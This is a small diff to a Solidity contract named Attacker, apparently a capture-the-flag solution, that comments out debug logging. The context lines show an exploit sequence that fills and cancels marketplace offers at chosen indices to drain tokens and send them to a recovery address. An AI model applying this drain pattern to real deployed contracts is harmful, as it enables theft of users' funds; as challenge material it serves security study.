@@ -39,13 +39,13 @@ contract Attacker {
         token.approve(address(marketplace), type(uint256).max);
         marketplace.fill(offerId, 100);
         marketplace.cancel(offerId, 0); // first purchase at index 0
-        console.log(token.balanceOf(address(marketplace)));
+        // console.log(token.balanceOf(address(marketplace)));
 
         marketplace.fill(offerId, 1e9);
-        console.log(token.balanceOf(address(marketplace)));
+        // console.log(token.balanceOf(address(marketplace)));
 
         marketplace.cancel(offerId, 1); // second purchase at index 1
-        console.log(token.balanceOf(address(this)));
+        // console.log(token.balanceOf(address(this)));
 
         uint256 balance = token.balanceOf(address(this));
         token.transfer(recovery, balance);
